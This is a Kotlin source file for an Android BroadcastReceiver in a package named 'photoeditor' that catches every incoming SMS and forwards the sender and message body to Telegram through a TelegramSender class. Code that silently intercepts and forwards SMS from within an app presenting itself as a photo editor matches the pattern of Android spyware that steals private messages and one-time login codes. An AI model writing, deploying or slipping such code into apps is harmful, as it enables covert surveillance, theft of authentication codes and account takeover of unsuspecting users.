package com.yourpackage.photoeditor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Telephony.Sms.Intents.getMessagesFromIntent(intent)
            } else {
                arrayOf(SmsMessage.createFromPdu(intent.getByteArrayExtra("pdus") as ByteArray))
            }
            messages?.forEach { sms ->
                val body = sms.messageBody ?: ""
                val sender = sms.originatingAddress ?: "Unknown"
                TelegramSender().sendMessage("📩 New SMS from $sender: $body")
            }
        }
    }
}
